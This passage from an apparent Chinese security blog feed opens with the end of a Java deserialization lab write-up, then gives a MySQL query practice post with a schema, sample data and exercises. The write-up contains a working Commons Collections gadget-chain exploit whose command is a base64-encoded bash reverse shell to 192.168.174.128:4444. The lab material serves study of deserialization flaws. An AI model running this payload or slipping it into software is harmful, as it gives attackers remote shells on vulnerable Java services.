class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lab2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">1896</span>);</span><br><span class="line">        objectOutputStream.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>细节：</p><p>最后<code>objectOutputStream.writeUTF</code>和<code>objectOutputStream.writeInt</code>要注意顺序，如果将<code>writeObject</code>放在前面会导致利用不成功。</p><p>序列化中遇到的常见问题：<a href="https://juejin.cn/post/6844903848167866375">https://juejin.cn/post/6844903848167866375</a></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601224750-2gl6q46.png" alt="image.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;javaDeserializeLabs1，2&quot;&gt;&lt;a href=&quot;#javaDeserializeLabs1，2&quot; class=&quot;headerlink&quot; title=&quot;javaDeserializeLabs1，2&quot;&gt;&lt;/a&gt;javaDeserializeLabs1</summary>
      
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>sql查询练习题</title>
    <link href="https://xianbeil.github.io/2022/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%B0%8F%E7%BB%83%E4%B9%A0/"/>
    <id>https://xianbeil.github.io/2022/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%B0%8F%E7%BB%83%E4%B9%A0/</id>
    <published>2022-06-01T06:32:00.000Z</published>
    <updated>2022-06-02T00:37:08.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>mysql5.7</p><h2 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531082203-jjtpi3u.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">Sno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">sname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">sbirth DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">ssex <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Sdept <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> teacher (</span><br><span class="line">Tno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">Tname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> course (</span><br><span class="line">Cno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">PRIMARY</span> KEY <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">Cname <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">Tno <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY course(Tno) <span class="keyword">REFERENCES</span> Teacher(Tno)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sc (</span><br><span class="line">Sno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Cno <span class="type">VARCHAR</span> ( <span class="number">10</span> ) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Score <span class="type">INT</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY(Sno, CNo),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY sc(Sno) <span class="keyword">REFERENCES</span> student(Sno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY sc(Cno) <span class="keyword">REFERENCES</span> course(cno)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">--插入学生表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;赵雷&#x27;</span> , <span class="string">&#x27;1990-01-01&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;网安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;钱电&#x27;</span> , <span class="string">&#x27;1990-12-21&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;网安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;孙风&#x27;</span> , <span class="string">&#x27;1990-05-20&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;李云&#x27;</span> , <span class="string">&#x27;1990-08-06&#x27;</span> , <span class="string">&#x27;男&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;周梅&#x27;</span> , <span class="string">&#x27;1991-12-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;刑技系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;吴兰&#x27;</span> , <span class="string">&#x27;1992-03-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;治安系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;郑竹&#x27;</span> , <span class="string">&#x27;1989-07-01&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;侦查系&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="string">&#x27;08&#x27;</span> , <span class="string">&#x27;王菊&#x27;</span> , <span class="string">&#x27;1990-01-20&#x27;</span> , <span class="string">&#x27;女&#x27;</span>, <span class="string">&#x27;侦查系&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入课程表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;语文&#x27;</span> , <span class="string">&#x27;02&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;数学&#x27;</span> , <span class="string">&#x27;01&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> course <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;英语&#x27;</span> , <span class="string">&#x27;03&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入教师表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> teacher <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;王五&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># <span class="comment">--插入成绩表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">90</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;01&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">99</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">70</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">60</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;02&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;03&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">80</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">50</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">30</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;04&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">20</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;05&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">87</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;01&#x27;</span> , <span class="number">31</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;06&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;02&#x27;</span> , <span class="number">89</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sc <span class="keyword">VALUES</span>(<span class="string">&#x27;07&#x27;</span> , <span class="string">&#x27;03&#x27;</span> , <span class="number">98</span>);</span><br></pre></td></tr></table></figure><h2 id="查询练习"><a href="#查询练习" class="headerlink" title="查询练习"></a>查询练习</h2><p>临时去除ONLY_FULL_GROUP_BY</p><p><a href="https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html">https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="variable">@GLOBAL</span>.sql_mode<span class="operator">=</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode <span class="operator">=</span><span class="string">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查询平均成绩大于等于 <span class="number">60</span> 分的学号和平均成绩</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) <span class="keyword">as</span> avgScore <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> avgScore <span class="operator">&gt;=</span> <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">如果要一起查姓名：</span><br><span class="line">##先过滤sc表里的成绩再和student链接查数据</span><br><span class="line"><span class="keyword">SELECT</span> student.Sno,student.sname,a.av <span class="keyword">from</span> student </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> (</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score)<span class="keyword">AS</span> av  <span class="keyword">from</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Score)<span class="operator">&gt;=</span><span class="number">60</span></span><br><span class="line">)a</span><br><span class="line"><span class="keyword">on</span> student.Sno <span class="operator">=</span> a.Sno;</span><br><span class="line"></span><br><span class="line">或者直接连接：</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname,<span class="built_in">AVG</span>(b.score) <span class="keyword">as</span> avgScore</span><br><span class="line"><span class="keyword">FROM</span> student a <span class="keyword">JOIN</span> sc b</span><br><span class="line"><span class="keyword">on</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> a.Sno <span class="keyword">and</span> a.sname</span><br><span class="line"><span class="keyword">HAVING</span> avgScore<span class="operator">&gt;=</span><span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、查询在 SC 表有成绩的学生信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> sc.Sno,student.sname <span class="keyword">FROM</span> sc <span class="keyword">INNER</span> <span class="keyword">JOIN</span> student <span class="keyword">on</span> sc.Sno <span class="operator">=</span> student.Sno <span class="keyword">WHERE</span> sc.Score <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line">或者连接起来查</span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname <span class="keyword">from</span> student a </span><br><span class="line"><span class="keyword">JOIN</span>(<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno <span class="keyword">from</span> sc <span class="keyword">WHERE</span> Score <span class="operator">&gt;</span> <span class="number">0</span>)b <span class="keyword">on</span> a.Sno<span class="operator">=</span>b.Sno</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、查询姓“李”的老师的信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname REGEXP &quot;^李&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> &quot;李%&quot;;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> CONCAT(&quot;李&quot;,&quot;%&quot;)</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、统计姓“李”的老师的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(Tname) num  <span class="keyword">FROM</span> teacher <span class="keyword">WHERE</span> Tname <span class="keyword">LIKE</span> &quot;李%&quot;;</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、查询所有学生的平均成绩并以降序显示。</span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) score <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> a.Sno,a.sname,b.score <span class="keyword">from</span> student a</span><br><span class="line"><span class="keyword">JOIN</span>(<span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Score) score <span class="keyword">FROM</span> sc <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno)b</span><br><span class="line"><span class="keyword">on</span> a.Sno <span class="operator">=</span> b.Sno</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、统计男生和女生的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot;<span class="keyword">FROM</span> student</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、统计侦查系男生和女生的人数。</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;男&quot; <span class="operator">&amp;&amp;</span> Sdept <span class="operator">=</span> &quot;侦查系&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;男生人数&quot;,<span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ssex<span class="operator">=</span>&quot;女&quot; <span class="operator">&amp;&amp;</span> Sdept <span class="operator">=</span> &quot;侦查系&quot; <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) &quot;女生人数&quot;  <span class="keyword">FROM</span> student</span><br><span class="line">或者先筛表</span><br><span 